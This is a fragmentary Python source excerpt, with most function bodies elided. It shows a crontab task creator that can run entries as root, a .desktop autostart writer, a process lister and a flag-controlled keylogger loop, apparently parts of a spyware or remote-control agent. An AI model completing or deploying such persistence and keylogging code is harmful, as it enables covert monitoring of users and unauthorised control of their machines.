...
def decode_bytes(dt, *, _ck=4096):
    ...
    ec = detect(dt[0 : 64].tobytes()).get('encoding') or ENCODING
...
def crontab(
    ...
    match c:
        case 'get':
            ...
            with StringIO(read_file(PATH_CRONTAB)) as buf:
                for l in buf:
                    i = l.split(sep)
        ...
        case 'create':
            ...
            task = f'{event} {"root" if root else LOGGED_USER} {quote(path)} {"" if args == "none" else args} #={name}'
            lb   = f'#={name}'
...
def startup(c, name=None, path=None, args='none'):
    ...
    match c:
        ...
        case 'create':
            ...
            p = f'{PATH_CONF_STARTUP}/{name}.desktop'
...
def ps():
    ...
    for i in psutil.process_iter((
        ...
        au((
            pid,    pg('name', NULL),    pg('username', NULL),
            cpu,    pmm,                 tim,
                    pg('status', NULL).upper()
        ))
...
def keylogger():
    ...
    while True:
        ...
        if not _isfile(FILE_KEYLOGGER_FLAG) or (read_file(FILE_KEYLOGGER_FLAG) != '1'):
            continue
